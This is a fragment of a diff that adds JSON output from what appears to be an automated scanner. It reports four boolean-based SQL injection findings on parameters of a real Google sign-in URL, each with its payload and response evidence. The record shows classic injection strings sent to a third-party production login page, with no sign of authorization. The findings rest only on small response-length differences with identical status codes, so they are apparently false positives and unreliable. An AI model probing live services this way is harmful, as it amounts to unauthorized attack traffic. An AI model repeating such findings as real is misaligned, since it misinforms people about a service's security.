+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "flowEntry",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 869903,
+          "false_length": 869867,
+          "length_diff": 36
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "ifkv",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898228,
+          "false_length": 897751,
+          "length_diff": 477
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "ifkv",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897638,
+          "false_length": 898132,
+          "length_diff": 494
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "ifkv",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897816,
+          "false_length": 897922,
+          "length_diff": 106
+        }
+      }
+    ]
+  }
+]
